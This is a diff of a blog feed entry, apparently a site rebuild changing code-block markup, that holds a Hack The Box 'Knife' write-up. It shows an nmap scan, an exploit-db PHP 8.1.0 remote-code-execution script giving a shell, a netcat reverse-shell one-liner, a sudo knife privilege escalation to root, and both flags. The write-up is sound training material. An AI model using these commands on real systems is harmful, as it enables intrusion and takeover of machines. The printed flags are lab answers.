-┌──(kali㉿kali)-[~/HTB/Knife] └─$ ip=10.10.10.242 ┌──(kali㉿kali)-[~/HTB/Knife] └─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) ┌──(kali㉿kali)-[~/HTB/Knife] └─$ nmap -sC -sV -p$ports $ip -oA nmap_result Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT Nmap scan report for 10.10.10.242 Host is up (0.</description>
+┌──(kali㉿kali)-[~/HTB/Knife] └─$ ip=10.10.10.242 ┌──(kali㉿kali)-[~/HTB/Knife] └─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) ┌──(kali㉿kali)-[~/HTB/Knife] └─$ nmap -sC -sV -p$ports $ip -oA nmap_result Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT Nmap scan report for 10.10.10.242 Host is up (0.</description>
       <content>&lt;p&gt;OS: Linux&lt;br&gt;
 Points: 20&lt;br&gt;
 Difficulty: Easy&lt;/p&gt;
 &lt;p&gt;ip=10.10.10.242&lt;/p&gt;
 &lt;h2 id=&#34;user-solution&#34;&gt;User solution&lt;/h2&gt;
 &lt;p&gt;The first thing is to do the nmap scan.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Knife]
-└─$ ip=10.10.10.242
-
-┌──(kali㉿kali)-[~/HTB/Knife]
-└─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
-
-┌──(kali㉿kali)-[~/HTB/Knife]
-└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT
-Nmap scan report for 10.10.10.242
-Host is up (0.083s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
-|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
-|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title:  Emergent Medical Idea
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now lets look at website at port 80.&lt;br&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──(kali㉿kali)-[~/HTB/Knife]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ ip=10.10.10.242
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Knife]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Knife]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report for 10.10.10.242
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up (0.083s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.41 (Ubuntu)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title:  Emergent Medical Idea
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now lets look at website at port 80. &lt;br&gt;
 From the nmap scan we know that the server uses Apache 2.4.41 and Ubuntu OS. Using Wappalyzer we found it also uses PHP 8.1.0.\&lt;/p&gt;
 &lt;p&gt;There is a RCE exploit for PHP 8.1.0. Download it from &lt;a href=&#34;https://www.exploit-db.com/exploits/49933&#34;&gt;exploit-db&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;Run the exploit and got the flag&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Knife]
-└─$ python3 exploits/49933.py
-Enter the full host url:
-http://10.10.10.242/
-
-Interactive shell is opened on http://10.10.10.242/
-Can&#39;t acces tty; job crontol turned off.
-$ whoami
-james
-
-$ pwd
-/
-
-$ cd /home/james; ls; cat user*
-authorized_keys
-hello
-hello.rb
-user.txt
-aec6c92f2b998dc3912f334ac0c69ed5
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;root-solution&#34;&gt;Root solution&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──(kali㉿kali)-[~/HTB/Knife]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ python3 exploits/49933.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Enter the full host url:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://10.10.10.242/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Interactive shell is opened on http://10.10.10.242/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Can&amp;#39;t acces tty; job crontol turned off.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;james
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;$ pwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;$ cd /home/james; ls; cat user*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;authorized_keys
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hello
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hello.rb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;aec6c92f2b998dc3912f334ac0c69ed5
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;root-solution&#34;&gt;Root solution&lt;/h2&gt;
 &lt;p&gt;Before procedding lets get a reverse shell at port 5454 with &lt;code&gt;mkfifo /tmp/f; nc &amp;lt;local-ip&amp;gt; 5454 &amp;lt; /tmp/f | /bin/sh &amp;gt;/tmp/f 2&amp;gt;&amp;amp;1; rm /tmp/f&lt;/code&gt; and run &lt;code&gt;nc -lvnp 5454&lt;/code&gt; before running the command.&lt;/p&gt;
 &lt;p&gt;I was unable to do the root part while the machine was active. Later from a help I realized I forgot to check GTFObins.&lt;/p&gt;
 &lt;p&gt;Coming to the process first we have to see which executables we can run as sudo.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;james@knife:/$ sudo -l
-Matching Defaults entries for james on knife:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User james may run the following commands on knife:
-    (root) NOPASSWD: /usr/bin/knife
-
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Search GTFObins for knife you will get a command for shell&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;james@knife:/$ sudo knife exec -E &#39;exec &amp;quot;/bin/sh&amp;quot;&#39;
-# whoami
-root
-# cat root/root.txt
-b1c946e0dcc0715cb9039799fe824278
-&lt;/code&gt;&lt;/pre&gt;</content>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;james@knife:/$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Matching Defaults entries for james on knife:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    env_reset, mail_badpass,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;User james may run the following commands on knife:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (root) NOPASSWD: /usr/bin/knife
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Search GTFObins for knife you will get a command for shell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;james@knife:/$ sudo knife exec -E &amp;#39;exec &amp;#34;/bin/sh&amp;#34;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# cat root/root.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b1c946e0dcc0715cb9039799fe824278
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
     </item>
     
   </channel>
